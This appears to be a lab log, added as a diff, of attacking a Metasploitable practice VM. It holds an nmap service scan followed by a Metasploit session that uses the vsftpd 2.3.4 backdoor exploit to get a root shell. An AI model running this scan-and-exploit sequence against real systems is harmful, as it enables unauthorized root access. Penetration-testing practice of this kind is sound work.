@@ -1,0 +1,184 @@
+
+
+............................. cracking metaspoitable..............................
+
+
+#nmap -A 192.168.195.135
+
+Starting Nmap 6.45 ( http://nmap.org ) at 2014-05-14 21:27 BDT
+Stats: 0:02:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.36% done; ETC: 21:30 (0:00:00 remaining)
+Nmap scan report for meta (192.168.195.135)
+Host is up (0.00017s latency).
+Not shown: 977 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+|_smtp-commands: Couldn't establish connection on port 25
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2010-03-17T14:07:45+00:00
+|_Not valid after:  2010-04-16T14:07:45+00:00
+|_ssl-date: 2014-05-07T20:48:06+00:00; -6d18h41m54s from local time.
+53/tcp   open  domain      ISC BIND 9.4.2
+| dns-nsid: 
+|_  bind.version: 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Metasploitable2 - Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      42111/tcp  mountd
+|   100005  1,2,3      53687/udp  mountd
+|   100021  1,3,4      33590/udp  nlockmgr
+|   100021  1,3,4      42559/tcp  nlockmgr
+|   100024  1          40920/tcp  status
+|_  100024  1          60915/udp  status
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  shell?
+1099/tcp open  rmiregistry GNU Classpath grmiregistry
+|_rmi-dumpregistry: Registry listing failed (No return data received from server)
+1524/tcp open  shell       Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+|_ftp-bounce: no banner
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+| vnc-info: 
+|   Protocol version: 3.3
+|   Security types: 
+|_    Unknown security type (33554432)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         Unreal ircd
+| irc-info: 
+|   server: irc.Metasploitable.LAN
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
+|   servers: 1
+|   users: 1
+|   lservers: 0
+|   lusers: 1
+|   uptime: 0 days, 4:42:36
+|   source host: 65E04666.2FD9FD1E.FFFA6D49.IP
+|_  source ident: nmap
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Apache Tomcat/5.5
+MAC Address: 00:0C:29:D2:26:2F (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP
+|_  System time: 2014-05-07T16:47:56-04:00
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms meta (192.168.195.135)
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 164.40 seconds
+
+
+
+msf > search vsftp
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                  Disclosure Date  Rank       Description
+   ----                                  ---------------  ----       -----------
+   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf > use exploit/unix/ftp/vsftpd_234_backdoor 
+
+msf exploit(vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  21               yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(vsftpd_234_backdoor) > set rhost 192.168.195.135
+rhost => 192.168.195.135
+msf exploit(vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.195.135  yes       The target address
+   RPORT  21               yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf exploit(vsftpd_234_backdoor) > exploit -z
+
+[*] Banner: 220 (vsFTPd 2.3.4)
+[*] USER: 331 Please specify the password.
+[+] Backdoor service has been spawned, handling...
+[+] UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 5 opened (192.168.195.1:44986 -> 192.168.195.135:6200) at 2014-05-14 22:26:11 +0600
+[*] Session 5 created in the background.
+msf exploit(vsftpd_234_backdoor) > sessions -l 
+
+Active sessions
+===============
+
+  Id  Type        Information  Connection
+  --  ----        -----------  ----------
+  5   shell unix               192.168.195.1:44986 -> 192.168.195.135:6200 (192.168.195.135)
+
+msf exploit(vsftpd_234_backdoor) > sessions -i 5
+[*] Starting interaction with 5...
+
+whoami 
+root
+
+
+
+
+
